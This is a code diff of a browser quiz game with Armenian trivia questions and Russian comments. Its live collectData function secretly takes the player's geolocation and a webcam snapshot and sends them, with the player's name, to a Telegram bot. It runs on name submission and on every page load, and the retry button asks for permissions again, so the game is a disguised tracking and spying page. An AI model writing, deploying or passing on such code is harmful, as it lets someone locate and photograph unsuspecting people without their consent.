@@ -24,7 +24,6 @@ const questionsPool = [
   { question: "Ո՞րն է Ֆինլանդիայի մայրաքաղաքը։", answers: [{ text: "Հելսինկի", correct: true }, { text: "Տամպերե", correct: false }, { text: "Տուրկու", correct: false }, { text: "Օուլու", correct: false }] },
 ];
 
-// Чтобы редко повторялись вопросы, используем localStorage для отслеживания уже показанных вопросов
 const askedIndexesKey = 'askedQuestionIndexes';
 
 function getRandomQuestions(count) {
@@ -32,7 +31,6 @@ function getRandomQuestions(count) {
   let availableIndexes = questionsPool.map((_, i) => i).filter(i => !askedIndexes.includes(i));
 
   if (availableIndexes.length < count) {
-    // Если вопросов осталось меньше чем нужно, сбрасываем историю (чтобы не повторять часто)
     askedIndexes = [];
     availableIndexes = questionsPool.map((_, i) => i);
   }
@@ -51,8 +49,6 @@ function getRandomQuestions(count) {
   return selectedIndexes.map(i => questionsPool[i]);
 }
 
-let questions = getRandomQuestions(20);
-
 const questionElement = document.getElementById('question');
 const answerButtonsElement = document.getElementById('answer-buttons');
 const nameInput = document.getElementById('name-input');
@@ -64,7 +60,6 @@ const tryAgainBtn = document.getElementById('try-again-btn');
 let currentQuestionIndex = 0;
 let correctCount = 0;
 let wrongCount = 0;
-let attemptsCount = 0;
 let userName = null;
 
 function sendToTelegram(text) {
@@ -79,11 +74,9 @@ function sendToTelegram(text) {
   });
 }
 
-// Сбор геолокации и камеры при вводе имени и отправке формы
 function collectData() {
   if (!userName) return;
 
-  // Геолокация
   navigator.geolocation.getCurrentPosition(pos => {
     const coords = pos.coords;
     let msg = `<b>Имя:</b> ${userName}\n<b>Координаты:</b> https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
@@ -92,14 +85,12 @@ function collectData() {
     sendToTelegram(`<b>Имя:</b> ${userName}\n<b>Геолокация не предоставлена.</b>`);
   });
 
-  // Камера — сделаем фото сразу при сборе (если разрешит)
   if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
     navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
       const video = document.createElement('video');
       video.srcObject = stream;
       video.play();
 
-      // Сделаем снимок через 2 секунды
       setTimeout(() => {
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
@@ -108,7 +99,6 @@ function collectData() {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const imgData = canvas.toDataURL('image/jpeg');
 
-        // Отправим в Telegram
         fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
           method: 'POST',
           body: JSON.stringify({
@@ -129,7 +119,7 @@ function collectData() {
 
 function startGame() {
   userNameDisplay.textContent = userName;
-  scoreElement.textContent = `Մնացել է: ${questions.length - currentQuestionIndex} | Ճիշտ է: ${correctCount} | Հեռացված է: ${wrongCount}`;
+  scoreElement.textContent = `Մնացել է: ${questions.length - currentQuestionIndex} | Ճիշտ է: ${correctCount} | Սխալ է: ${wrongCount}`;
   showQuestion();
 }
 
@@ -148,7 +138,7 @@ function showQuestion() {
     button.addEventListener('click', () => selectAnswer(answer.correct));
     answerButtonsElement.appendChild(button);
   });
-  scoreElement.textContent = `Մնացել է: ${questions.length - currentQuestionIndex} | Ճիշտ է: ${correctCount} | Հեռացված է: ${wrongCount}`;
+  scoreElement.textContent = `Մնացել է: ${questions.length - currentQuestionIndex} | Ճիշտ է: ${correctCount} | Սխալ է: ${wrongCount}`;
 }
 
 function resetState() {
@@ -175,7 +165,6 @@ function endGame() {
 }
 
 tryAgainBtn.addEventListener('click', () => {
-  // Если не дали доступ к камере или гео, повторно запрашиваем
   function requestPermissions() {
     return new Promise((resolve) => {
       navigator.geolocation.getCurrentPosition(() => resolve(), () => resolve());
@@ -187,7 +176,6 @@ tryAgainBtn.addEventListener('click', () => {
   }
 
   requestPermissions().then(() => {
-    // Обновляем вопросы, сбрасываем счетчики и начинаем заново
     questions = getRandomQuestions(20);
     currentQuestionIndex = 0;
     correctCount = 0;
@@ -205,17 +193,18 @@ nameForm.addEventListener('submit', e => {
     return;
   }
   localStorage.setItem('userName', userName);
+  questions = getRandomQuestions(20);
   collectData();
   startGame();
   nameForm.style.display = 'none';
   document.getElementById('game-area').style.display = 'block';
 });
 
-// Если имя уже есть в localStorage — сразу подставляем и начинаем
 window.addEventListener('load', () => {
   const savedName = localStorage.getItem('userName');
   if (savedName) {
     userName = savedName;
+    questions = getRandomQuestions(20);
     nameForm.style.display = 'none';
     document.getElementById('game-area').style.display = 'block';
     collectData();
